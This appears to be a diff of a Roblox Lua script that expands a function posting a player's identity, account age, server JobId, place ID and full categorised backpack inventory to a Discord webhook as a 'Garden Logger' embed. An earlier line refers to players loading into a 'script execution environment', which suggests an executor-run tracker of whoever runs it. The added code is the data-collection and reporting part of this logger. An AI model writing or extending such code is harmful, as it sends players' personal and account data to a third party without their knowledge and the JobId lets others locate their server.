@@ -63,10 +63,42 @@ local function sendBackpackToWebhook()
     local backpack = localPlayer:FindFirstChild("Backpack")
     if not backpack then warn("Backpack not found") return end
 
-    local items = {}
+    -- Lookup sets for fast categorisation
+    local seedSet, crateSet = {}, {}
+    for _, n in ipairs(FRUITS) do seedSet[n:lower()] = true end
+    for _, n in ipairs(CRATES) do crateSet[n:lower()] = true end
+
+    -- Heuristics for gear / pets (tool names in Backpack don't have Inv_ prefix)
+    local function isGear(name)
+        local n = name:lower()
+        return n:find("sprinkler") or n:find("watering") or n:find("can")
+            or n:find("mushroom") or n:find("trowel") or n:find("shovel")
+            or n:find("fertilizer") or n:find("hoe") or n:find("rake")
+    end
+
+    -- Known pets from priority list + common ones
+    local petSet = {}
+    for _, n in ipairs({"Raccoon","DragonFly","Unicorn","Bunny","Robin","Frog","Deer",
+                        "Cat","Dog","Hamster","Owl","Snake","Turtle","Pig","Cow",
+                        "Sheep","Chicken","Duck","Fox","Wolf","Bear","Panda","Penguin"}) do
+        petSet[n:lower()] = true
+    end
+
+    local function categorise(name)
+        local low = name:lower()
+        if seedSet[low]  then return "seeds"  end
+        if crateSet[low] then return "crates" end
+        if petSet[low]   then return "pets"   end
+        if isGear(name)  then return "gear"   end
+        return "other"
+    end
+
+    local buckets = { seeds = {}, pets = {}, gear = {}, crates = {}, other = {} }
+    local equippedItems = {}
+
     for _, tool in ipairs(backpack:GetChildren()) do
         if tool:IsA("Tool") then
-            table.insert(items, "📦 " .. tool.Name)
+            table.insert(buckets[categorise(tool.Name)], tool.Name)
         end
     end
 
@@ -74,31 +106,92 @@ local function sendBackpackToWebhook()
     if character then
         for _, tool in ipairs(character:GetChildren()) do
             if tool:IsA("Tool") then
-                table.insert(items, "⚔️ " .. tool.Name .. " *(Equipped)*")
+                table.insert(equippedItems, tool.Name)
             end
         end
     end
 
-    local itemList = #items > 0 and table.concat(items, "\n") or "*No items found in inventory.*"
-    
-    -- ISO 8601 Timestamp for the embed footer
-    local timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    local totalCount = #buckets.seeds + #buckets.pets + #buckets.gear
+                     + #buckets.crates + #buckets.other + #equippedItems
+
+    -- Pretty list builder (markdown bullets, capped at Discord's 1024 char field limit)
+    local function formatList(list)
+        if #list == 0 then return "`—  empty  —`" end
+        local lines = {}
+        for i, name in ipairs(list) do
+            lines[i] = "`•` " .. name
+        end
+        local text = table.concat(lines, "\n")
+        if #text > 1010 then
+            text = text:sub(1, 1000) .. "\n`… +more`"
+        end
+        return text
+    end
+
+    -- Roblox avatar endpoints (headshot for thumbnail, bust for author icon)
+    local avatarThumb  = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. localPlayer.UserId .. "&width=420&height=420&format=png"
+    local avatarAuthor = "https://www.roblox.com/bust-thumbnail/image?userId=" .. localPlayer.UserId .. "&width=150&height=150&format=png"
+
+    -- Account age + game info
+    local accountAgeDays = localPlayer.AccountAge
+    local placeId = tostring(game.PlaceId)
+    local jobId   = (game.JobId ~= "" and game.JobId) or "Studio / Solo"
+    local serverPlayers = #Players:GetPlayers()
+
+    -- ISO-8601 timestamp for Discord-native time rendering
+    local function isoTimestamp()
+        local t = os.date("!*t")
+        return string.format("%04d-%02d-%02dT%02d:%02d:%02d.000Z",
+            t.year, t.month, t.day, t.hour, t.min, t.sec)
+    end
+
+    -- Build fields dynamically so empty categories don't waste embed space
+    local fields = {
+        { name = "👤  User ID",     value = "`" .. tostring(localPlayer.UserId) .. "`", inline = true },
+        { name = "📆  Account Age", value = "`" .. accountAgeDays .. " days`",          inline = true },
+        { name = "👥  In Server",   value = "`" .. serverPlayers .. " players`",        inline = true },
+        { name = "🗺️  Place ID",   value = "`" .. placeId .. "`", inline = true },
+        { name = "🧩  Job ID",      value = "`" .. jobId   .. "`", inline = false },
+        { name = "⚔️  Equipped (" .. #equippedItems .. ")",
+          value = formatList(equippedItems), inline = false },
+    }
+
+    local function addCategory(emoji, label, list)
+        if #list > 0 then
+            table.insert(fields, {
+                name = emoji .. "  " .. label .. " (" .. #list .. ")",
+                value = formatList(list),
+                inline = false
+            })
+        end
+    end
+
+    addCategory("🌾", "Seeds",  buckets.seeds)
+    addCategory("🐾", "Pets",   buckets.pets)
+    addCategory("🛠️", "Gear",   buckets.gear)
+    addCategory("📦", "Crates", buckets.crates)
+    addCategory("❔", "Other",  buckets.other)
 
     local HttpService = game:GetService("HttpService")
     local payload = HttpService:JSONEncode({
+        username = "Garden Logger",
         embeds = {{
-            title = "🔍 Player Inventory Report",
-            description = "A player has loaded into the script execution environment.",
-            color = 10181046, -- Sleek Purple Hex color
-            fields = {
-                { name = "👤 User Information", value = string.format("**Username:** %s\n**Display Name:** %s\n**User ID:** `%s`", localPlayer.Name, localPlayer.DisplayName, tostring(localPlayer.UserId)), inline = false },
-                { name = string.format("🎒 Backpack Contents (%d)", #items), value = itemList, inline = false }
+            author = {
+                name = localPlayer.DisplayName .. "  •  @" .. localPlayer.Name,
+                icon_url = avatarAuthor,
+                url = "https://www.roblox.com/users/" .. localPlayer.UserId .. "/profile"
             },
-            footer = { 
-                text = "Automated Inventory Logger",
-                icon_url = "https://i.imgur.com/K6Yw7fE.png" -- Clean bullet icon
+            title = "🌱  Inventory Snapshot",
+            url = "https://www.roblox.com/users/" .. localPlayer.UserId .. "/profile",
+            description = "```ansi\n\27[2;32mPlayer joined — full backpack scan captured.\27[0m\n```",
+            color = 5025616, -- garden green (#4CAF50)
+            thumbnail = { url = avatarThumb },
+            fields = fields,
+            footer = {
+                text = "Garden Logger  •  " .. totalCount .. " total items",
+                icon_url = avatarAuthor
             },
-            timestamp = timestamp
+            timestamp = isoTimestamp()
         }}
     })
 
